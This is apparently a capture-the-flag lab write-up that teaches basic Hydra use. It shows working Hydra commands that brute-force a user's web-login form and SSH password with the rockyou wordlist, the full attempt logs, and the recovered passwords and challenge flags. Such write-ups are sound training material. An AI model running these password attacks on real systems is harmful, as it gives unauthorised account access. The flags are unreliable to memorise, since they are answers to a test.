---
title: Hydra
desc: 'Fundamental usage of Hydra'
---
## Recon/OSINT

- Target IP = 10.10.77.177
- Username: molly

Checking out the source code for the webpage `10.10.77.177/login`:

```html
<!doctype html>
<html lang="en">
  <head>
    <meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
<link rel="stylesheet" href="/css/bootstrap.min.css">
<title>Hydra Challenge</title>

  </head>
  <link href="/css/signin.css" rel="stylesheet">
  <body class="text-center">
    <form class="form-signin" action="/login" method="post">
      <a href='/'><img class="mb-4" style='width: 200px;' src="/img/herc.gif" alt=""></a>
      <h1 class="h3 mb-3 font-weight-normal">Login</h1>
      
      <label for="inputEmail" class="sr-only">Username</label>
      <input type="text" name="username" class="form-control" placeholder="Username" required autofocus>
      <label for="inputPassword" class="sr-only">Password</label>
      <input type="password" name="password" class="form-control" placeholder="Password" required>
      <button class="btn btn-lg btn-primary btn-block" type="submit">Login</button>
      <p class="mt-5 mb-3 text-muted">&copy; HydraSite 2012 - 2020</p>
    </form>
  </body>
  <script src="/js/jquery.slim.min.js"></script>
  <script src="/js/popper.min.js"></script>
  <script src="/js/bootstrap.min.js"></script>
</html>
```
The login fields are as follows:

- Method: POST
- Username: username
- Password: password

## Exploitation

Using Hydra to brute-force Molly's web-login.

```text
┌──(siachen㉿kali)-[/dev/shm]
└─$ hydra -l molly -P /usr/share/wordlists/rockyou.txt 10.10.77.177 http-post-form "/login:username=^USER^&password=^PASS^:F=Your username or password is incorrect" -V -f
Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-12-06 11:19:07
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking http-post-form://10.10.77.177:80/login:username=^USER^&password=^PASS^:F=Your username or password is incorrect
[ATTEMPT] target 10.10.77.177 - login "molly" - pass "123456" - 1 of 14344399 [child 0] (0/0)
[ATTEMPT] target 10.10.77.177 - login "molly" - pass "12345" - 2 of 14344399 [child 1] (0/0)
[ATTEMPT] target 10.10.77.177 - login "molly" - pass "123456789" - 3 of 14344399 [child 2] (0/0)
[ATTEMPT] target 10.10.77.177 - login "molly" - pass "password" - 4 of 14344399 [child 3] (0/0)
[ATTEMPT] target 10.10.77.177 - login "molly" - pass "iloveyou" - 5 of 14344399 [child 4] (0/0)
[ATTEMPT] target 10.10.77.177 - login "molly" - pass "princess" - 6 of 14344399 [child 5] (0/0)
[ATTEMPT] target 10.10.77.177 - login "molly" - pass "1234567" - 7 of 14344399 [child 6] (0/0)
[ATTEMPT] target 10.10.77.177 - login "molly" - pass "rockyou" - 8 of 14344399 [child 7] (0/0)
[ATTEMPT] target 10.10.77.177 - login "molly" - pass "12345678" - 9 of 14344399 [child 8] (0/0)
[ATTEMPT] target 10.10.77.177 - login "molly" - pass "abc123" - 10 of 14344399 [child 9] (0/0)
[ATTEMPT] target 10.10.77.177 - login "molly" - pass "nicole" - 11 of 14344399 [child 10] (0/0)
[ATTEMPT] target 10.10.77.177 - login "molly" - pass "daniel" - 12 of 14344399 [child 11] (0/0)
[ATTEMPT] target 10.10.77.177 - login "molly" - pass "babygirl" - 13 of 14344399 [child 12] (0/0)
[ATTEMPT] target 10.10.77.177 - login "molly" - pass "monkey" - 14 of 14344399 [child 13] (0/0)
[ATTEMPT] target 10.10.77.177 - login "molly" - pass "lovely" - 15 of 14344399 [child 14] (0/0)
[ATTEMPT] target 10.10.77.177 - login "molly" - pass "jessica" - 16 of 14344399 [child 15] (0/0)
[ATTEMPT] target 10.10.77.177 - login "molly" - pass "654321" - 17 of 14344399 [child 7] (0/0)
[ATTEMPT] target 10.10.77.177 - login "molly" - pass "michael" - 18 of 14344399 [child 8] (0/0)
[ATTEMPT] target 10.10.77.177 - login "molly" - pass "ashley" - 19 of 14344399 [child 0] (0/0)
[ATTEMPT] target 10.10.77.177 - login "molly" - pass "qwerty" - 20 of 14344399 [child 1] (0/0)
[ATTEMPT] target 10.10.77.177 - login "molly" - pass "111111" - 21 of 14344399 [child 2] (0/0)
[ATTEMPT] target 10.10.77.177 - login "molly" - pass "iloveu" - 22 of 14344399 [child 4] (0/0)
[ATTEMPT] target 10.10.77.177 - login "molly" - pass "000000" - 23 of 14344399 [child 5] (0/0)
[ATTEMPT] target 10.10.77.177 - login "molly" - pass "michelle" - 24 of 14344399 [child 3] (0/0)
[ATTEMPT] target 10.10.77.177 - login "molly" - pass "tigger" - 25 of 14344399 [child 6] (0/0)
[ATTEMPT] target 10.10.77.177 - login "molly" - pass "sunshine" - 26 of 14344399 [child 9] (0/0)
[ATTEMPT] target 10.10.77.177 - login "molly" - pass "chocolate" - 27 of 14344399 [child 10] (0/0)
[ATTEMPT] target 10.10.77.177 - login "molly" - pass "password1" - 28 of 14344399 [child 13] (0/0)
[ATTEMPT] target 10.10.77.177 - login "molly" - pass "soccer" - 29 of 14344399 [child 15] (0/0)
[ATTEMPT] target 10.10.77.177 - login "molly" - pass "anthony" - 30 of 14344399 [child 11] (0/0)
[ATTEMPT] target 10.10.77.177 - login "molly" - pass "friends" - 31 of 14344399 [child 12] (0/0)
[ATTEMPT] target 10.10.77.177 - login "molly" - pass "butterfly" - 32 of 14344399 [child 14] (0/0)
[ATTEMPT] target 10.10.77.177 - login "molly" - pass "purple" - 33 of 14344399 [child 7] (0/0)
[ATTEMPT] target 10.10.77.177 - login "molly" - pass "angel" - 34 of 14344399 [child 0] (0/0)
[ATTEMPT] target 10.10.77.177 - login "molly" - pass "jordan" - 35 of 14344399 [child 2] (0/0)
[ATTEMPT] target 10.10.77.177 - login "molly" - pass "liverpool" - 36 of 14344399 [child 15] (0/0)
[ATTEMPT] target 10.10.77.177 - login "molly" - pass "justin" - 37 of 14344399 [child 12] (0/0)
[ATTEMPT] target 10.10.77.177 - login "molly" - pass "loveme" - 38 of 14344399 [child 8] (0/0)
[80][http-post-form] host: 10.10.77.177   login: molly   password: sunshine
[STATUS] attack finished for 10.10.77.177 (valid pair found)
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-12-06 11:19:16
```
Using credentials `molly:sunshine` on the web-login page, flag 1 is: **THM{2673a7dd116de68e85c48ec0b1f2612e}**

In order to find flag 2, we need to brute-force Molly's SSH password.

```text
┌──(siachen㉿kali)-[~]
└─$ hydra -l molly -P /usr/share/wordlists/rockyou.txt 10.10.77.177 ssh   
Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-12-06 10:52:26
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking ssh://10.10.77.177:22/
[22][ssh] host: 10.10.77.177   login: molly   password: butterfly
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 4 final worker threads did not complete until end.
[ERROR] 4 targets did not resolve or could not be connected
[ERROR] 0 target did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-12-06 10:53:16
```
Log in to SSH and retrieve flag 2:

```text
┌──(siachen㉿kali)-[~]
└─$ ssh molly@10.10.77.177   
The authenticity of host '10.10.77.177 (10.10.77.177)' can't be established.
ED25519 key fingerprint is SHA256:zZI2bUKvmMuaGDIM04ucCB7JERRXQGT8w98tuBlsH/Q.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.77.177' (ED25519) to the list of known hosts.
molly@10.10.77.177's password: 
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.4.0-1092-aws x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

65 packages can be updated.
32 updates are security updates.


Last login: Tue Dec 17 14:37:49 2019 from 10.8.11.98
molly@ip-10-10-77-177:~$ ls
flag2.txt
molly@ip-10-10-77-177:~$ cat flag2.txt
THM{c8eeb0468febbadea859baeb33b2541b}
```